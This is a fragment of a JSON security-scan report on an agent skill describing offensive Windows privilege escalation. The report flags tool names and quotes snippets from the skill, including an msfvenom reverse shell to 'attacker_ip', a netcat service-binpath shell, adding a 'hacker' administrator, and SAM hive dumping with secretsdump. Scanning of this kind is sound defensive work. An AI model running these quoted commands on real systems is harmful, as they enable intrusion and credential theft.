+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 580,
+          "executable": false,
+          "size_bytes": 22580,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "YR4",
+          "finding_id": "finding-37cfe14959f8430cbd8cdb54b57a672d",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'privilege_escalation_tools': Privilege escalation tools and techniques [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": null
+          },
+          "finding": "WinPEAS; WinPEAS; WinPEAS; winPEAS; winpeas; winPEAS; WinPEAS; WinPEAS; JuicyPotato; PrintSpoofer; SweetPotato; JuicyPotato; JuicyPotato; JuicyPotato; JuicyPotato; PrintSpoofer; PrintSpoofer; PrintSpo",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": "---\nname: offensive-windows-privesc\ndescription: \"Comprehensive Windows privilege escalation methodology for offensive security engagements. Covers the full attack surface from a standard user shell to NT AUTHORITY\\\\SYSTEM: token impersonation via SeImpersonate and SeAssignPrimaryToken privileges using JuicyPotato, PrintSpoofer, GodPotato, SweetPotato, and RoguePotato; service misconfigurations including unquoted service paths, weak service DACLs, writable service binaries, and insecure service creation permissions; AlwaysInstallElevated MSI exploitation; DLL hijacking through search order abuse, phantom DLL loading, and writable PATH directory injection; UAC bypass techniques via fodhelper.exe, eventvwr.exe, CMSTP, and environment variable manipulation; scheduled task abuse for writable task actions and new task creation; registry autorun exploitation for persistence and escalation; PrintNi",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5746956f8fd3a349792dc6bb5759f9a7d7559b37103f29257557d8a3db81b0ca",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 3,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-680ff8507e714cf780bdf49a9602ef09",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'exploit_framework': Exploit framework components and payloads [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.8,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 128,
+            "end_line": null
+          },
+          "finding": "msfvenom -p ; msfvenom -p ; msfvenom -p ",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": "c service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\"'\n\n# Or use PowerUp\nGet-ServiceUnquoted\n\n# Example: path is C:\\Program Files\\Some Service\\binary.exe\n# Windows tries these in order:\n#   C:\\Program.exe\n#   C:\\Program Files\\Some.exe\n#   C:\\Program Files\\Some Service\\binary.exe\n\n# If you can write to C:\\Program Files\\Some Service\\\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o \"C:\\Program Files\\Some Service\\Some.exe\"\n\n# Restart the service\nsc stop \"ServiceName\"\nsc start \"ServiceName\"\n# Or wait for system reboot\n```\n\n### Weak Service DACLs\n\n```powershell\n# Check service permissions with accesschk (Sysinternals)\n.\\accesschk64.exe -uwcqv \"Authenticated Users\" * /accepteula\n.\\accesschk64.exe -uwcqv \"Users\" * /accepteula\n.\\accesschk64.exe -uwcqv \"Everyone\" * /accepteula\n\n# If SERVICE_CHANGE_CONFIG is granted\nsc config \"VulnService\" binpath= \"C:\\Users\\Public\\nc.exe attacker_ip 4444 -e cmd.exe",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "3affc10ecad8b67f578e4093d2cc8842a6348c66c51978b9a2a2375da9946523",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 128,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR1",
+          "finding_id": "finding-f15376f659454f54a9430ff12a97ff9b",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'info_stealer': Information stealer patterns (credential harvesting, browser data theft) [malware]",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 434,
+            "end_line": null
+          },
+          "finding": "Mimikatz; mimikatz; mimikatz; Mimikatz; Mimikatz; reg save HKLM\\SAM C:\\Users\\Public\\SAM",
+          "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+          "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+          "code_snippet": "system(\"net user hacker Password123! /add\");\n        system(\"net localgroup administrators hacker /add\");\n    }\n    return TRUE;\n}\n```\n\n---\n\n## Credential Harvesting\n\nCredentials stored on the system can enable lateral movement or direct escalation to higher-privileged accounts.\n\n### SAM Database Extraction\n\n```powershell\n# SAM and SYSTEM hive extraction (requires admin or backup operators group)\nreg save HKLM\\SAM C:\\Users\\Public\\SAM\nreg save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM\nreg save HKLM\\SECURITY C:\\Users\\Public\\SECURITY\n\n# Transfer to attacker machine and extract with secretsdump\nimpacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL\n\n# Volume Shadow Copy method (if reg save fails)\nwmic shadowcopy call create Volume='C:\\'\nvssadmin list shadows\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Users\\Public\\SAM\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Users\\Public\\SYSTEM\n```\n\n### DPAPI and ",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5987e11e532f982fc4ea2d4eb054f04c40147608a2dede3e609fff4914bd4b7d",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 434,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-61a5f94ed04247f2a3a102aa43d86d94",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'offensive_tool_references': References to well-known offensive security tools [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 439,
+            "end_line": null
+          },
+          "finding": "impacket-secretsdump",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": "e system can enable lateral movement or direct escalation to higher-privileged accounts.\n\n### SAM Database Extraction\n\n```powershell\n# SAM and SYSTEM hive extraction (requires admin or backup operators group)\nreg save HKLM\\SAM C:\\Users\\Public\\SAM\nreg save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM\nreg save HKLM\\SECURITY C:\\Users\\Public\\SECURITY\n\n# Transfer to attacker machine and extract with secretsdump\nimpacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL\n\n# Volume Shadow Copy method (if reg save fails)\nwmic shadowcopy call create Volume='C:\\'\nvssadmin list shadows\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Users\\Public\\SAM\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Users\\Public\\SYSTEM\n```\n\n### DPAPI and LSA Secrets\n\n```powershell\n# DPAPI -- list credential blobs\ndir C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Credentials\\\ndir C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Credentials\\\n\n# Mimikatz DPA",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "7f6b6b969d3362a1f7fd0fde9c4b1298816957327afc67fafce01bf2147185b5",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 439,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "status": "complete_with_caveats",
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 505,
+            "end_line": 505,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 505,
+            "column": 66,
+            "evidence": "| Service abuse | Service configuration changes (Event ID 7045), sc.exe/reg.exe execution, binary replacement (file integrity) |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 4,
+        "findings_after_filtering": 4,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    }
+  ]
+}
